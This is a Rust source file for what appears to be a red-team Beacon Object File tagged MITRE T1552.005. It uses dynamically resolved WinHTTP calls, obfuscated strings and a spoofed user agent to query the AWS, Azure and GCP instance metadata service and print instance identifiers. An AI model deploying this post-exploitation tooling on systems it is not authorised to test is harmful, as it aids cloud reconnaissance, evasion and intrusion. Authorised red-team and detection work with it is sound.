#![no_std]
#![cfg_attr(not(test), no_main)]

use core::ffi::c_void;
use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1552.005", name: "Cloud Instance Metadata API", tactic: "Credential Access" },
];

dfr_fn!(win_http_open(agent: *const u16, access: u32, proxy: *const u16, bypass: *const u16, flags: u32) -> *mut c_void, module = "winhttp.dll", api = "WinHttpOpen");
dfr_fn!(win_http_connect(session: *mut c_void, server: *const u16, port: u16, reserved: u32) -> *mut c_void, module = "winhttp.dll", api = "WinHttpConnect");
dfr_fn!(win_http_open_request(connect: *mut c_void, verb: *const u16, path: *const u16, version: *const u16, referrer: *const u16, accept: *const *const u16, flags: u32) -> *mut c_void, module = "winhttp.dll", api = "WinHttpOpenRequest");
dfr_fn!(win_http_add_request_headers(request: *mut c_void, headers: *const u16, length: u32, modifiers: u32) -> i32, module = "winhttp.dll", api = "WinHttpAddRequestHeaders");
dfr_fn!(win_http_send_request(request: *mut c_void, headers: *const u16, hdr_len: u32, optional: *const c_void, opt_len: u32, total: u32, context: usize) -> i32, module = "winhttp.dll", api = "WinHttpSendRequest");
dfr_fn!(win_http_receive_response(request: *mut c_void, reserved: *mut c_void) -> i32, module = "winhttp.dll", api = "WinHttpReceiveResponse");
dfr_fn!(win_http_read_data(request: *mut c_void, buf: *mut u8, to_read: u32, read: *mut u32) -> i32, module = "winhttp.dll", api = "WinHttpReadData");
dfr_fn!(win_http_close_handle(handle: *mut c_void) -> i32, module = "winhttp.dll", api = "WinHttpCloseHandle");

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn to_wide(s: &[u8], buf: &mut [u16]) -> usize {
    let n = s.len().min(buf.len() - 1);
    for i in 0..n { buf[i] = s[i] as u16; }
    buf[n] = 0;
    n
}

fn http_get(session: *mut c_void, path: &[u8], header: Option<&[u8]>, buf: &mut [u8]) -> Result<usize, &'static str> {
    let mut srv = [0u16; 20];
    to_wide(b"169.254.169.254", &mut srv);
    let conn = unsafe { win_http_connect(session, srv.as_ptr(), 80, 0) }.map_err(|_| "resolve")?;
    if conn.is_null() { return Err("connect failed"); }

    let mut path_w = [0u16; 128];
    to_wide(path, &mut path_w);
    let mut verb_w = [0u16; 4];
    to_wide(b"GET", &mut verb_w);

    let req = unsafe { win_http_open_request(conn, verb_w.as_ptr(), path_w.as_ptr(), core::ptr::null(), core::ptr::null(), core::ptr::null(), 0) }.map_err(|_| "resolve")?;
    if req.is_null() { unsafe { let _ = win_http_close_handle(conn); } return Err("request failed"); }

    if let Some(hdr) = header {
        let mut hdr_w = [0u16; 64];
        to_wide(hdr, &mut hdr_w);
        unsafe { let _ = win_http_add_request_headers(req, hdr_w.as_ptr(), hdr.len() as u32, 0x20000000); }
    }

    let sent = unsafe { win_http_send_request(req, core::ptr::null(), 0, core::ptr::null(), 0, 0, 0) }.map_err(|_| "resolve")?;
    if sent == 0 { unsafe { let _ = win_http_close_handle(req); let _ = win_http_close_handle(conn); } return Err("send failed"); }

    let recv = unsafe { win_http_receive_response(req, core::ptr::null_mut()) }.map_err(|_| "resolve")?;
    if recv == 0 { unsafe { let _ = win_http_close_handle(req); let _ = win_http_close_handle(conn); } return Err("no response"); }

    let mut total = 0usize;
    let mut read: u32 = 0;
    let ok = unsafe { win_http_read_data(req, buf.as_mut_ptr(), buf.len() as u32, &mut read) }.map_err(|_| "resolve")?;
    if ok != 0 { total = read as usize; }

    unsafe { let _ = win_http_close_handle(req); let _ = win_http_close_handle(conn); }
    Ok(total)
}

fn run() -> Result<(), &'static str> {
    let mut agent_w = [0u16; 8];
    to_wide(b"Mozilla", &mut agent_w);
    let session = unsafe { win_http_open(agent_w.as_ptr(), 0, core::ptr::null(), core::ptr::null(), 0) }.map_err(|_| "resolve")?;
    if session.is_null() { return Err("session failed"); }

    let mut buf = [0u8; 1024];

    // AWS
    if let Ok(n) = http_get(session, b"/latest/meta-data/instance-id", None, &mut buf) {
        if n > 0 {
            obf! { let provider = "AWS"; }
            println!("[+] Provider: {}", provider);
            println!("    instance-id: {}", core::str::from_utf8(&buf[..n]).unwrap_or("?"));
            unsafe { let _ = win_http_close_handle(session); }
            return Ok(());
        }
    }

    // Azure
    if let Ok(n) = http_get(session, b"/metadata/instance?api-version=2021-02-01", Some(b"Metadata:true"), &mut buf) {
        if n > 0 {
            obf! { let provider = "Azure"; }
            println!("[+] Provider: {}", provider);
            println!("    response: {}", core::str::from_utf8(&buf[..n.min(256)]).unwrap_or("?"));
            unsafe { let _ = win_http_close_handle(session); }
            return Ok(());
        }
    }

    // GCP
    if let Ok(n) = http_get(session, b"/computeMetadata/v1/instance/name", Some(b"Metadata-Flavor:Google"), &mut buf) {
        if n > 0 {
            obf! { let provider = "GCP"; }
            println!("[+] Provider: {}", provider);
            println!("    vm-name: {}", core::str::from_utf8(&buf[..n]).unwrap_or("?"));
            unsafe { let _ = win_http_close_handle(session); }
            return Ok(());
        }
    }

    println!("[-] No cloud metadata service detected");
    unsafe { let _ = win_http_close_handle(session); }
    Ok(())
}
